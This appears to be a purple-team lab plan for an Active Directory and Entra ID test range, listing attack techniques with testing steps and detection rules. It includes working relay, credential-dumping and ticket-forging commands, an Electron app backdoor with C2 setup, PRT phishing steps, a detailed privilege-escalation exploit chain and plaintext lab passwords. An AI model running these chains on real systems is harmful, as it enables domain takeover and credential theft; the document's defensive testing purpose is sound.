14. **GAC Hijacking** — .NET Global Assembly Cache injection (iPurple.team)
15. **UnPAC-the-Hash** — NT hash from certificate via U2U (SpecterOps)
16. **ETW Internals** — telemetry tampering detection (kernullist)
17. **DCOMIllusionist** — fileless DCOM lateral movement via .NET deserialization (Synacktiv)
18. **SQL Server 2025 AI Abuse** — data exfil, NTLM coercion, C2 transport (SpecterOps)
19. **CVE-2026-41089 Netlogon RCE** — unauthenticated DC exploit, standalone exercise (CERT-EU)
20. **DLL Hijacking** — persistence via trusted binary (RTO course)
21. **COM Hijacking** — registry-based persistence (RTO course)
22. **IFEO** — debugger hijacking persistence (RTO course)
23. **LSA SSP / Password Filter** — credential theft + persistence (RTO course)
24. **UACME** — UAC bypass via 70+ techniques (RTO course)
25. **Named Pipe Impersonation** — priv-esc via pipe impersonation (RTO course)
26. **Handle Leak** — kernel handle leak exploitation (RTO course)
27. **Token Dance** — token manipulation persistence (RTO course)
28. **LAPS Extraction** — local admin password solution extraction (RTO course)
29. **BetterSuccessor** — dMSA post-patch abuse (Altered Security)
30. **RBCD** — resource-based constrained delegation via ACE#20 (Altered Security)
31. **Pass-the-Cert** — Entra ID lateral movement via certificates (Altered Security)
32. **DCSync Detection** — DRSBind/DRSGetNCChanges detection reference (Altered Security)
33. **Logon Types Reference** — Windows logon type → credential location mapping (Altered Security)

---

## Tier 3 — Dirk-jan Mollema Blog (AD/Azure Research Authority)

**Why this tier:** Dirk-jan Mollema is the primary researcher for both on-prem AD (forest trusts, delegation, ADCS) and Azure/Entra ID (PRT, Cloud Kerberos Trust, Actor tokens). His blog (https://dirkjanm.io/) is the canonical reference for many of the techniques in this campaign. CADRE has direct attack surface: mbr01 has unconstrained delegation, dc01 has Cloud Sync agent, and CADRE has 2 forests with SID Filter OFF.

### 43. ADIDNSDump — DNS Reconnaissance (Phase 0) ⏳

**Source:** https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/
**Year:** 2019
**Tool:** adidnsdump (https://github.com/dirkjanm/adidnsdump)
**MITRE:** T1590.002 (Gather Victim Network Information: DNS)
**Status:** ⏳ Pending — Phase 0 recon

**Relevance to CADRE:** Phase 0 — DNS enumeration. AD-integrated DNS allows any user to query all records by default. adidnsdump enumerates the AD DNS zone, including records the querying user has no explicit read rights to. Complements Kerberos user enum (port 88) and BloodHound.

**Why CADRE needs it:** Range.local forest is "external" — but DNS zone transfers may leak internal records. ADIDNSDump can dump both cadre.local and child.cadre.local zones from any authenticated user.

**Campaign location:** Phase 0 (Recon) — alongside Kerberos user enum. Output feeds Phase 4 (BloodHound).

**Testing plan:**
1. `adidnsdump -u cadre.local\\intern_blue -p '1nt3rn_Blu3!' dc01.cadre.local` from Kali
2. Compare output with BloodHound computer list
3. Check for unpublicized records (Azure/Entra endpoints, Azure AD Connect server, etc.)

**Detection:** Zeek dns.log queries against authoritative AD DNS servers. Elastic cadre-* DNS volume rule can flag bulk enumeration queries.

---

### 44. RBCD + NTLM Relay (Phase 6 Lateral Movement) ⏳

**Source:** https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
**Year:** 2019
**Tool:** krbrelayx (https://github.com/dirkjanm/krbrelayx)
**MITRE:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting) + T1187 (Forced Authentication)
**Status:** ⏳ Pending — Phase 6 lateral movement

**Relevance to CADRE:** Phase 6 — ACE#20 (`dir_operations → mbr01$: GenericWrite`) enables RBCD on mbr01. Pair with NTLM relay to authenticate as dir_operations → trigger RBCD → impersonate dir_operations against mbr01 → SYSTEM. This is the most impactful lateral movement technique in the lab.

**Why CADRE needs it:** RBCD on mbr01 is the playbook's intended Phase 6 path. Without NTLM relay, you need to coerce dir_operations to authenticate. With relay, you can do it silently.

**Campaign location:** Phase 6 (Lateral Movement) — alternate path to mbr01$ admin. Chains ACE#20 (GenericWrite) + NTLM relay.

**Testing plan:**
1. Run `ntlmrelayx.py -t ldap://dc01.cadre.local --delegate-access --escalate-user dir_operations` on Kali
2. Coerce dir_operations authentication via Coercer (`coercer coerce -t dc01 -l <relay>`) or PetitPotam
3. ntlmrelayx sets RBCD on mbr01$ → dir_operations gets RBCD rights
4. `getST.py -spn cifs/mbr01.cadre.local -impersonate administrator cadre.local/dir_operations`
5. `psexec.py -k mbr01.cadre.local` → SYSTEM

**Detection:** Suricata SID:1000050-1000053 (coercion rules), Zeek dce_rpc.log (relay connections), Elastic cadre-003 RBCD detection rule (msDS-AllowedToActOnBehalfOfOtherIdentity changes).

---

### 45. Unconstrained Delegation Abuse via krbrelayx (Phase 6) ⏳

**Source:** https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
**Year:** 2019
**Tool:** krbrelayx (https://github.com/dirkjanm/krbrelayx)
**MITRE:** T1187 (Forced Authentication) + T1550.003 (Use Alternate Authentication Material: Pass the Ticket)
**Status:** ⏳ Pending — Phase 6 lateral movement

**Relevance to CADRE:** Phase 6 — mbr01 has **unconstrained delegation** enabled. Any user authenticating to mbr01 (or any service running as SYSTEM) gets their TGT extracted via krbrelayx. CADRE has mbr01 with TRUSTED_FOR_DELEGATION flag set. mssqlsvc and IIS service accounts are typical targets.

**Why CADRE needs it:** mbr01's unconstrained delegation is the highest-value Phase 6 target. Coercing a DA or DC to authenticate to mbr01 → extract TGT → DCSync. This is the most direct path to Enterprise Admin.

**Campaign location:** Phase 6 (Lateral Movement) → Phase 7 (DCSync) — short-circuits multiple phases.

**Testing plan:**
1. Run `krbrelayx.py -krbtgt dc01.cadre.local` on mbr01 (listening for incoming TGT submissions)
2. Coerce dc01$ via Coercer MS-RPRN (PrinterBug) to authenticate to mbr01
3. krbrelayx captures dc01$ TGT → DC TGT = full domain compromise
4. `secretsdump.py -k -no-pass dc01.cadre.local` → all hashes

**Detection:** Suricata SID:1000050 (MS-RPRN coercion rule). Elastic Windows EID 4624 (Logon) Type 3 with "Network" logon process for TGT submission to non-DC. This is one of the most reliably detected attacks.

**Note:** This is **a DANGEROUS technique in production** — it gives instant DA. Only test in lab.

---

### 46. NTLM Relay to ADCS (ESC8) ⏳

**Source:** https://dirkjanm.io/ntlm-relaying-to-ad-cs/
**Year:** 2021
**Tool:** ntlmrelayx + certipy
**MITRE:** T1187 (Forced Authentication) + T1558 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — Branch B ADCS

**Relevance to CADRE:** Branch B (ADCS) — NTLM relay against ADCS web enrollment endpoints (ESC8). CADRE has ADCS deployed on dc01 (CEP/CES). Combine with Coercer to force authentication → relay to ADCS → get certificate as victim user → UnPAC-the-Hash → NT hash.

**Why CADRE needs it:** ESC8 is the most impactful ADCS attack in modern environments. ADCS web enrollment is commonly exposed and rarely hardened. CADRE has the full ADCS infrastructure (CA, CEP, CES) deployed.

**Campaign location:** Branch B (ADCS) — Phase B.3 (ESC1-8). Chains Coercer → NTLM relay → certificate issuance → UnPAC.

**Testing plan:**
1. `certipy find -u analyst_t2@cadre.local -p 'T2_Ch@ng3d!' -dc-ip 192.168.77.10` to find ESC8 vulnerable endpoints
2. `ntlmrelayx.py -t http://cadre-dc01-ca.cadre.local/certsrv/certfnsh.asp -smb2support --adcs` on Kali
3. Coerce a target user via Coercer
4. ntlmrelayx auto-issues certificate → save as `.pfx`
5. `certipy auth -pfx <user>.pfx -dc-ip 192.168.77.10` → TGT → secretsdump

**Detection:** Suricata ESC8 relay detection (HTTP POST to /certsrv/ from attacker IP). Elastic ADCS EID 4886 (certificate issued) + EID 4887 (certificate request). Track unusual template issuance.

---

### 47. SMB-to-LDAP Relay (CVE-2019-1040) ⏳

**Source:** https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/
**Year:** 2019
**Tool:** ntlmrelayx + printerbug (pre-patch, but worth studying)
**MITRE:** T1187 (Forced Authentication) + T1078 (Valid Accounts)
**Status:** ⏳ Pending — study reference (patched on Server 2025)

**Relevance to CADRE:** Phase 6 study reference. CVE-2019-1040 bypasses NTLM MIC → enables SMB-to-LDAP relay → RCE as SYSTEM on any unpatched server. **Patched on Server 2025** but the technique is foundational for understanding relay attacks. Worth a study reference entry.

**Why CADRE needs it:** Understanding the relay attack chain (Coercer → ntlmrelayx → RBCD/ADCS/LDAP) is required for both Phase 6 execution and detection engineering. Server 2025 has MIC enforcement, so this exact CVE won't work, but the relay primitives still apply.

**Campaign location:** Detection engineering reference only. Add to plan1.7 as relay attack baseline.

**Testing plan:** Not applicable on Server 2025. Study reference.

**Detection:** n/a (won't fire on Server 2025). Use as reference for understanding relay chain.

---

### 48. Zerologon Alternative Exploitation (Phase 7) ⏳

**Source:** https://dirkjanm.io/a-different-way-of-abusing-zerologon/
**Year:** 2020
**Tool:** impacket zerologon (improved version)
**MITRE:** T1190 (Exploit Public-Facing Application)
**Status:** ⏳ Pending — study reference (patched on Server 2025)

**Relevance to CADRE:** Phase 7 study reference. CVE-2020-1472 Zerologon originally required 256 brute-force attempts (1 in 256 chance per attempt). Dirk-jan's version uses Netlogon Secure Channel establishment to drop the secret to a known value in 1 attempt, then dump hashes. Safer and faster.

**Why CADRE needs it:** Foundation for understanding the Netlogon Secure Channel. The technique itself is patched on Server 2025, but the method is the basis for CVE-2026-41089 (the standalone exercise we already have). Worth a study reference.

**Campaign location:** Detection engineering reference. Connected to CVE-2026-41089 standalone exercise.

**Testing plan:** Not applicable on Server 2025. Use as reference for Netlogon attack surface.

**Detection:** n/a (won't fire on Server 2025). Use as reference for Netlogon protocol.

---

### 49. Forest Trust SID Filtering Study (Phase 8) ✅

**Source:** https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/
**Year:** 2018
**Tool:** n/a (reference)
**MITRE:** T1485 (Data Destruction - relevant for Golden/Silver Ticket detection)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 8). Read before Phase 8 — critical because SID Filter is OFF on CADRE trust.

**Relevance to CADRE:** Phase 8 (Forest Trust) — foundational reference. CADRE has cadre.local ↔ child.cadre.local with **SID Filter OFF**. This means SID injection across the trust is possible. The blog post explains exactly how SID filtering works (or doesn't).

**Why CADRE needs it:** Critical to understand Phase 8. Without SID filtering, an attacker in child domain can inject SIDs from cadre.local into TGT requests → get DA in parent. This is the Phase 8 attack path we need to test.

**Campaign location:** Phase 8 (Forest Trust) — study reference for SID injection attack. Pairs with CVE-2020-0665 part 2 (trust bypass logic flaw).

**Testing plan:** Read both parts before executing Phase 8. After reading, document the exact attack flow:
1. Compromise child.cadre.local user
2. Forge inter-realm TGT with cadre.local DA SID injected (SID history)
3. Present to child DC for inter-realm referral TGS
4. Use referral TGS to access cadre.local resources as DA

**Detection:** Zeek kerberos.log — flag inter-realm TGT requests with SID history field set. Elastic cadre-* rule for SID injection.

---

### 50. CVE-2020-0665 Forest Trust Bypass Study (Phase 8) ✅

**Source:** https://dirkjanm.io/active-directory-forest-trusts-part-2-trust-bypass/
**Year:** 2021
**Tool:** n/a (reference)
**MITRE:** T1558 (Steal or Forge Kerberos Tickets)
**Status:** ✅ Adopted into CAMPAIGNS.md Study Reference Library (Phase 8). Patched reference; included for threat-modeling completeness.

**Relevance to CADRE:** Phase 8 (Forest Trust) — CVE-2020-0665 is a Microsoft Kerberos implementation bug where the path of trusted forest objects is constructed incorrectly, allowing an attacker to bypass SID filtering via a specially-crafted SPN. Patched in 2020, but the technique is foundational.

**Why CADRE needs it:** Pairs with #49 (SID filtering study) for Phase 8 understanding. Even on patched systems, the technique can be detected by examining SPN routing.

**Campaign location:** Phase 8 (Forest Trust) — study reference. Patched, won't fire on Server 2025.

**Testing plan:** n/a (patched). Use as reference for understanding trust boundaries.

**Detection:** n/a (patched). Use as detection reference for SPN routing.

---

### 51. Azure AD Connect DPAPI Dump (Phase 3.5) ✅

**Source:** https://dirkjanm.io/active-directory-azure-ad-connect-vulnerabilities/
**Year:** 2019
**Tool:** adconnectdump
**MITRE:** T1555 (Credentials from Password Stores)
**Status:** ✅ Adopted into CAMPAIGNS.md Branch 3.5 — 3.5M (Azure AD Connect DPAPI Dump). Cloud Sync agent is on dc01. Full test plan.

**Relevance to CADRE:** Phase 3.5 — if CADRE has Azure AD Connect deployed, the MSOL account credentials are stored using DPAPI. Once SYSTEM is obtained, adconnectdump can extract these credentials and pivot to Entra ID. **CADRE has the Cloud Sync agent on dc01** — this attack applies.

**Why CADRE needs it:** Once we have SYSTEM via GodPotato on mbr01, we can run adconnectdump to extract the cloud sync credentials → use them to authenticate to Entra ID → enumerate cloud environment. This is the bridge to Plan 11.

**Campaign location:** Phase 3.5 (Credential Access) — after SYSTEM obtained. Pairs with Plan 11 (EntraGoat) initial access.

**Testing plan:**
1. `adconnectdump` on dc01 (where Cloud Sync agent runs)
2. Extract MSOL account credentials
3. Use ROADtools to authenticate to Entra ID
4. Enumerate users, groups, applications
5. Look for Global Admin or Application Admin roles

**Detection:** Sysmon EID 1 (adconnectdump.exe execution). File create events on MSOL account credential files. **Sensitive** — Cloud Sync agent access is heavily monitored in real environments.

---

### 52. Actor Tokens → Global Admin (Plan 11) ⏳

**Source:** https://dirkjanm.io/one-token-to-rule-them-all/
**Year:** 2025
**Tool:** Custom PowerShell + Azure CLI
**MITRE:** T1078.004 (Valid Accounts: Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — **MOST IMPACTFUL Entra ID vulnerability ever found**. Actor tokens (token issued by an "Actor" service on behalf of a tenant) can be abused to gain Global Admin in **any Entra ID tenant** that has not explicitly disabled Actor token support. CADRE's EntraGoat environment should test this immediately.

**Why CADRE needs it:** If successful, this gives instant Global Admin in any tenant with default config. Microsoft's response was to allow tenants to disable Actor tokens, but most haven't.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.1 first item to test. Requires EntraGoat environment.

**Testing plan:**
1. Set up EntraGoat lab (separate from CADRE if no Azure subscription)
2. Follow Dirk-jan's PoC steps to request an Actor token
3. Use the token to call Microsoft Graph API
4. Add a new Global Admin user
5. Document the attack chain for detection engineering

**Detection:** Microsoft Defender for Cloud Apps (formerly MCAS) flags unusual Actor token requests. Custom Azure AD audit log query for Actor token issuance. **Most orgs have no detection for this** — it's a brand new attack class.

---

### 53. Cloud Kerberos Trust → Domain Admin (Plan 11) ⏳

**Source:** https://dirkjanm.io/obtaining-domain-admin-from-azure-ad-via-cloud-kerberos-trust/
**Year:** 2023
**Tool:** ROADtools + Impacket
**MITRE:** T1558 (Steal or Forge Kerberos Tickets)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — **CRITICAL for CADRE**. CADRE has the Cloud Sync agent on dc01. If Cloud Kerberos Trust is enabled, an Entra ID attacker can request a Kerberos ticket for a Hybrid Azure AD-joined device → use it to authenticate to on-prem AD as that device → chain to DA.

**Why CADRE needs it:** This is the most direct Azure → on-prem attack path. Cloud Sync makes it accessible. If we can simulate this in EntraGoat, we have a complete hybrid attack story.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.2 second item. Requires Cloud Kerberos Trust enabled.

**Testing plan:**
1. From Entra ID, identify a Hybrid Azure AD-joined device (e.g., dc01$)
2. Use ROADtools to request a Kerberos ticket for the device principal name
3. Use the ticket with Impacket to authenticate to dc01
4. Run secretsdump against dc01 → KRBTGT hash
5. Golden Ticket → full domain

**Detection:** Zeek kerberos.log — flag inter-realm TGS requests from non-DC sources. Elastic Azure AD sign-in log — flag Kerberos ticket requests from untrusted IPs. **CADRE has Zeek + ES already, so this is detectable.**

---

### 54. PRT Phishing (Plan 11) ⏳

**Source:** https://dirkjanm.io/phishing-for-primary-refresh-tokens/
**Year:** 2023
**Tool:** ROADtools + custom phishing page
**MITRE:** T1528 (Steal Application Access Token) + T1078.004 (Valid Accounts: Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Initial access to Entra ID via PRT phishing. PRT is a Primary Refresh Token issued by Azure AD to devices — equivalent to a TGT for cloud. Phishing the PRT gives a persistent, MFA-bypassing token that works until the device object is deleted.

**Why CADRE needs it:** This is the most realistic Plan 11 initial access vector. Real attackers use PRT phishing to bypass MFA entirely. CADRE's EntraGoat should test this end-to-end.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.3 third item. Pairs with Hybrid Phish kit.

**Testing plan:**
1. Set up phishing page that mimics Azure AD device join flow
2. Victim "joins" → PRT issued to attacker-controlled device
3. Use PRT to mint SSO cookies → access Exchange, SharePoint, etc.
4. Enumerate Global Admin roles
5. Document the attack chain

**Detection:** Microsoft Defender for Identity (MDI) flags unusual PRT requests. Azure AD sign-in log — flag PRT requests from non-managed device IPs. Custom Elastic rule: impossible travel + new device PRT issuance.

---

### 55. Intune ADCS ESC1 (Plan 11) ⏳

**Source:** https://dirkjanm.io/extending-ad-cs-attack-surface-to-the-cloud-with-intune-certificates/
**Year:** 2025
**Tool:** certipy + Intune admin
**MITRE:** T1558 (Steal or Forge Kerberos Tickets) + T1078.004 (Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — **CRITICAL HYBRID ATTACK**. Intune can issue ADCS certificates via SCEP. If Intune admin can configure a vulnerable certificate template, the resulting cert can be used for ESC1 attacks against on-prem AD. Bridges cloud admin → on-prem DA.

**Why CADRE needs it:** Intune admin is often a less-protected role than Domain Admin. If we can show that Intune admin → on-prem DA via ADCS ESC1, the impact is huge.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.4 fourth item. Requires Intune + ADCS integration.

**Testing plan:**
1. Set up Intune certificate profile in EntraGoat
2. Configure vulnerable template (e.g., ENROLLEE_SUPPLIES_SUBJECT + client auth EKU)
3. Enroll a "device" → certificate issued with attacker-controlled SAN
4. Use certipy auth to authenticate as DA
5. Document the full chain

**Detection:** Elastic ADCS EID 4886/4887 (certificate issued) with ENROLLEE_SUPPLIES_SUBJECT flag. Intune audit log for SCEP profile creation. **Most orgs don't monitor Intune certificate issuance.**

---

### 56. Temporary Access Pass Lateral Movement (Plan 11) ⏳

**Source:** https://dirkjanm.io/lateral-movement-with-temporary-access-passes/
**Year:** 2024
**Tool:** ROADtools + Impacket
**MITRE:** T1556 (Modify Authentication Process) + T1078.004
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Temporary Access Passes (TAPs) are time-limited passcodes used for passwordless onboarding. Once obtained, they can be used to authenticate to Entra ID, mint a PRT, and pivot to on-prem if the user is hybrid-joined. CADRE has hybrid users (analyst_cloud, analyst_t1, etc.) — this attack applies.

**Why CADRE needs it:** TAPs are increasingly popular for reducing MFA fatigue. If an attacker can intercept a TAP (e.g., via email or SMS), they can bypass MFA entirely.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.5 fifth item. Pairs with PRT Phishing (#54).

**Testing plan:**
1. In EntraGoat, create a TAP for a test user
2. Use ROADtools to redeem the TAP → PRT issued
3. Use PRT to access Exchange Online → extract sensitive email
4. If user is hybrid, use PRT to access on-prem via Cloud Kerberos Trust
5. Document attack chain

**Detection:** Azure AD audit log — flag TAP issuance followed by immediate authentication. Defender for Cloud Apps — flag unusual TAP redemption patterns. **CADRE can detect this with Azure AD sign-in log queries.**

---

### 57. Federated Credentials Persistence (Plan 11) ⏳

**Source:** https://dirkjanm.io/persisting-on-entra-id-apps-with-federated-credentials/
**Year:** 2024
**Tool:** Azure CLI / PowerShell
**MITRE:** T1136.003 (Create Account: Cloud Account) + T1078.004
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Federated credentials on Entra ID apps enable long-term persistence. Once added, an attacker can mint tokens for the app indefinitely (no password rotation needed). Also affects User Managed Identities.

**Why CADRE needs it:** This is a **stealthy persistence mechanism** that bypasses traditional credential rotation. If we can show the persistence potential, we have a strong detection engineering story.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.6 sixth item. Persistence phase of EntraGoat.

**Testing plan:**
1. Compromise an Entra ID app via Application Admin role
2. Add a federated credential (e.g., GitHub Actions OIDC)
3. Use GitHub Actions workflow to mint tokens for the app
4. App tokens have whatever permissions the app has (potentially Graph API)
5. Use the tokens to enumerate users, send mail, etc.
6. Document the persistence

**Detection:** Azure AD audit log — flag federated credential addition. Microsoft Defender for Cloud Apps — flag app token requests from unusual sources. **CADRE has ES + Azure AD integration potential.**

---

### 58. Abusing Application Admin → Global Admin (Plan 11) ⏳

**Source:** https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/
**Year:** 2019
**Tool:** Azure CLI / MSOnline PowerShell
**MITRE:** T1078.004 (Valid Accounts: Cloud Accounts)
**Status:** ⏳ Pending — Plan 11 EntraGoat

**Relevance to CADRE:** Plan 11 — Application Admin role in Entra ID can add credentials to default Office 365 applications (Microsoft Graph, etc.). Once credentials are added, the attacker can authenticate as the app → escalate to Global Admin. **Still unpatched in 2026** — Microsoft considers it "by-design."

**Why CADRE needs it:** This is a long-standing privilege escalation path that most Entra ID tenants are vulnerable to. Detection engineering for this is critical.

**Campaign location:** Plan 11 (Cloud/Entra ID) — P11.7 seventh item.

**Testing plan:**
1. In EntraGoat, obtain Application Admin role
2. Add a client secret to Microsoft Graph service principal
3. Authenticate as the app via OAuth2 client credentials flow
4. Call Graph API with app permissions → enumerate users
5. Look for Global Admin role assignments
6. Document the attack chain

**Detection:** Azure AD audit log — flag credential addition to default apps. MSOnline PowerShell module — flag unusual app credential creation. **CADRE has Azure AD audit log integration potential via ES.**

---

### 59. Electron App Backdooring (Loki C2) — Phase 3 Defense Evasion ✅

**Source:** https://whiteknightlabs.com/2026/01/20/backdooring-electron-applications/
**Tool:** Loki C2 (https://github.com/boku7/Loki)
**MITRE:** T1218 (System Binary Proxy Execution) + T1036 (Masquerading)
**Status:** ⏳ Pending — Phase 3 defense evasion

**Relevance to CADRE:** Replace `resources/app` JS code in signed Electron apps (Teams, Discord, Mailspring) with C2 implant. App is signed → bypasses WDAC, AppLocker, and most EDR. C2 via Azure Blob Storage (`*.blob.core.windows.net`) — legitimate Azure domain blends with normal traffic.

**Why CADRE needs it:**
- Bypasses application control (WDAC, AppLocker) — signed app execution
- C2 over legitimate Azure domains — bypasses network filtering
- Works against MDE and other EDRs without obfuscation in many cases
- Mailspring is vulnerable to this technique (open source Electron app)

**Campaign location:** Phase 3 (Execution) — defense evasion. Variant of existing supply-chain exercises (F-01 to F-13).

**Testing plan:**
1. Install Mailspring on mbr01
2. Download Loki C2 server on Kali
3. Generate implant with Azure Blob SAS token
4. Replace `resources/app` in Mailspring with implant
5. Run on mbr01 → verify C2 connection established
6. Verify detection: Sysmon EID 11 (file create in `resources\app\`), process creation from Electron app

**Detection:**
- Sysmon EID 11: file creation in `resources\app\` outside update cycle
- Suricata SID:1000080: TLS to `*.blob.core.windows.net` from non-browser process
- Elastic: process creation from signed Electron app spawning cmd/powershell
- File integrity: hash change in `resources\app\` folder

---

## Tier 3 Summary

| # | Item | Phase | Year | Status |
|---|------|-------|------|--------|
| 43 | ADIDNSDump | Phase 0 | 2019 | ⏳ |
| 44 | RBCD + NTLM Relay | Phase 6 | 2019 | ⏳ |
| 45 | Unconstrained Delegation (krbrelayx) | Phase 6 | 2019 | ⏳ |
| 46 | NTLM Relay to ADCS (ESC8) | Branch B | 2021 | ⏳ |
| 47 | SMB-to-LDAP Relay (CVE-2019-1040) | Phase 6 | 2019 | ⏳ |
| 48 | Zerologon Alternative | Phase 7 | 2020 | ⏳ |
| 49 | Forest Trust SID Filtering | Phase 8 | 2018 | ⏳ |
| 50 | CVE-2020-0665 Trust Bypass | Phase 8 | 2021 | ⏳ |
| 51 | Azure AD Connect DPAPI Dump | Phase 3.5 | 2019 | ✅ |
| 52 | Actor Tokens → Global Admin | Plan 11 | 2025 | ⏳ |
| 53 | Cloud Kerberos Trust → DA | Plan 11 | 2023 | ⏳ |
| 54 | PRT Phishing | Plan 11 | 2023 | ⏳ |
| 55 | Intune ADCS ESC1 | Plan 11 | 2025 | ⏳ |
| 56 | Temporary Access Pass Lateral | Plan 11 | 2024 | ⏳ |
| 57 | Federated Credentials Persistence | Plan 11 | 2024 | ⏳ |
| 58 | Application Admin → GA | Plan 11 | 2019 | ⏳ |
| 59 | Electron App Backdooring (Loki C2) | Phase 3 | 2026 | ✅ |

**16 new items added** (Items 43-58). **Plus Item 59** (Electron backdooring). **Total Tier 3: 17.**

---

## Cross-Reference Index

This is the running index of all items by source. Updated as items are added.

| # | Item | Source |
|---|------|--------|
| 1-2 | MSSQL/SCCM CVEs, MSSQLHound | SpecterOps (2026) |
| 3-4 | iPurple ADWS, WMI | iPurple (2025) |
| 5-9 | WerFault, SharpHound, Cross-Session, BadSuccessor, WinGet, etc. | iPurple (2025) |
| 10 | NTLMv1 Rainbow Tables | iPurple (2025) |
| 11-13 | ADWS, WerFault, Cross-Session | iPurple (2025) |
| 14 | SpeechRuntime Lateral | iPurple (2025) |
| 15 | UnPAC-the-Hash | SpecterOps (2025) |
| 16 | ETW Internals | kernullist (2025) |
| 17 | DCOMIllusionist | Synacktiv (2025) |
| 18 | SQL Server 2025 AI Abuse | SpecterOps (2025) |
| 19 | CVE-2026-41089 Netlogon RCE | CERT-EU (2026) |
| 20-28 | RTO course techniques (DLL/COM/IFEO/LSA/UACME/Piper/Handle/Token/LAPS) | Zero Point Security (2025) |
| 29-33 | BetterSuccessor, RBCD, Pass-the-Cert, DCSync Detection, Logon Types | Altered Security (2025) |
| 34-36 | LAPS, BloodHound, ctfmon | iPurple (2025) |
| 37-42 | RTO additional techniques | Zero Point Security (2025) |
| **43-58** | **Dirk-jan blog (ADCS, Forest Trust, Azure, PRT, etc.)** | **dirkjanm.io (2018-2025)** |
| 59 | Electron App Backdooring (Loki C2) | White Knight Labs (2026) |
| **78-80** | **MiniPlasma, GreenPlasma, YellowKey (Win EoP / BitLocker bypass)** | **Project NightCrawler (NightmareEclipse, 2026-06)** |
| **81-82** | **UnCanny Coerce (NTLM coercion via InstallService) + UnCanny LPE (SYSTEM via InstallService)** | **0xHossam (2026-06-19)** |
| 83 | IPv4-mapped IPv6 Phishing URL Parser Bypass | SANS ISC (Xavier Mertens, 2026-06-19) |
| **84-89** | **KDS Root Key Attacks — Golden gMSA/dMSA, DSRM, LAPS bulk, DPAPI-NG SID Protector** | **Grafnetter TROOPERS26 (2026-06-20)** |

---

## Project NightCrawler — Windows Vulnerability PoCs (2026-06-18)

**Source:** https://git.projectnightcrawler.dev/explore/repos (Gitea, NightmareEclipse / "Church of Malware")
**Cloned:** `references/project-nightcrawler/` (source-only, exploit binaries removed)
**Analysis:** `docs/internal/references/project-nightcrawler-analysis.md`
**Total:** 8 unique repos, ~45.7 MiB. Multi-account mirrors (hxcker-263, Clozof, andsilvaf2024, recar) all forks of NightmareEclipse originals.

**CADRE relevance summary:**
| Repo | Server 2025? | CADRE Impact |
|------|--------------|--------------|
| **MiniPlasma** | ✅ All Windows | **HIGH** — Standard user → SYSTEM via CVE-2020-17103 race |
| **GreenPlasma** | ✅ Server 2026 (=2025) | **HIGH** — CTFMON arbitrary section creation (partial PoC) |
| **YellowKey** | ✅ Server 2022/2025 | **MEDIUM** — BitLocker bypass (physical access class) |
| UnDefend | Any | LOW — Defender already disabled on CADRE |
| RoguePlanet | Claimed, PoC fails on Server | LOW — std user can't mount ISO on Server |
| GreatXML | Not specified | LOW — desktop only |
| RedSun | Not specified | LOW — Defender-specific |
| BlueHammer | Not specified, bugs noted | LOW — research grade |

### 78. MiniPlasma — CVE-2020-17103 Unpatched → SYSTEM 🔬

**Repo:** `references/project-nightcrawler/MiniPlasma/`
**Source file:** `PoC_AbortHydration_ArbitraryRegKey_EoP/Program.cs` (369 lines C#)
**Vulnerability:** `cldflt!HsmOsBlockPlaceholderAccess` race condition. Originally reported by James Forshaw (Google Project Zero) as CVE-2020-17103 — claimed fixed but the patch appears rolled back or never landed. All Windows versions affected.

**Exploit chain (4 stages):**

| Stage | Action |
|-------|--------|
| 0 | Spawns stages 1, 2, 3 as child processes |
| 1 | Registry NotifyChange watcher + anon-token flipper thread + tight `CfAbortOperation(pid, 0, Block)` loop (race trigger) |
| 2 | Open `HKCU\Software\Policies\Microsoft\CloudFiles` (WriteDac+WriteOwner) → apply SD giving Everyone + Anonymous GENERIC_ALL → delete `BlockedApps` tree → create symbolic link `BlockedApps` → `\Registry\User\.DEFAULT\Volatile Environment` → re-trigger race under symlink |
| 3 | Cleanup symlink → set `HKU\.DEFAULT\Volatile Environment\windir` = `<attacker_dir>` → copy self to `<attacker_dir>\System32\wermgr.exe` → trigger WER `QueueReporting` task (runs wermgr.exe AS SYSTEM) → SYSTEM wermgr connects to `MiniPlasmaWERPipe` named pipe → duplicated token → `Win32Process.CreateProcessAsUser(conhost.exe)` |

**Key insight:** Does NOT require SeImpersonatePrivilege, SeDebugPrivilege, or any admin token. Privilege escalation comes from abusing **Windows Error Reporting's auto-start of `wermgr.exe`** from the `windir` environment variable — which the symlink lets us control.

**CADRE relevance:** All 5 Windows VMs run Server 2025 — all vulnerable. `cldapi.dll::CfAbortOperation` is the trigger and is exported only by cldapi.dll. **Test target: mbr01 first** (non-DC, snapshot before testing — DC01 destabilization could break AD).

**Detection surface (cadre-e* candidates):**
- `logs-endpoint.events.process-*`: cldapi.dll loaded by non-system process
- `logs-endpoint.events.process-*`: schtasks trigger of `\Microsoft\Windows\Windows Error Reporting\QueueReporting` by non-system
- `logs-endpoint.events.registry-*`: `HKCU\Software\Policies\Microsoft\CloudFiles` modifications + `BlockedApps` symlink creation
- `logs-endpoint.events.registry-*`: `HKU\.DEFAULT\Volatile Environment\windir` set to non-`C:\Windows` value
